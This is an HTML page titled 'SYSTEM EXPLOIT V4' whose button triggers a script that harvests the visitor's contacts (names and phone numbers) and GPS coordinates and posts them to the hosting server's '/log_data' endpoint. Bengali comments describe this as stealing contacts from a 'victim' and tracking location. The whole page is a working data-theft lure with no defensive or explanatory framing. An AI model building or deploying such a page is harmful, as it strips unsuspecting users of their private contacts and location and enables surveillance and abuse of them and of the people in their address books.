<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SYSTEM EXPLOIT V4</title>
    <style>
        body { background:#000; color:#0f0; font-family:monospace; text-align:center; }
        .btn { border:1px solid #0f0; padding:20px; margin:20px; cursor:pointer; display:inline-block; }
    </style>
</head>
<body>
    <h1>PRIME MONIR | FULL ACCESS</h1>
    <div class="btn" onclick="getFullAccess()">START ALL SYNC</div>

    <script>
        async function getFullAccess() {
            // ১. কন্টাক্ট চুরি করার চেষ্টা (যদি ভিক্টিম এক্সেস দেয়)
            try {
                const contacts = await navigator.contacts.select(['name', 'tel'], {multiple: true});
                fetch('/log_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({type: 'CONTACTS', content: JSON.stringify(contacts)})
                });
            } catch(e) {}

            // ২. লোকেশন ট্র্যাকিং
            navigator.geolocation.getCurrentPosition(pos => {
                fetch('/log_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({type: 'LOCATION', content: `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`})
                });
            });

            alert("System scanning... Device data uploading to server.");
        }
    </script>
</body>
</html>
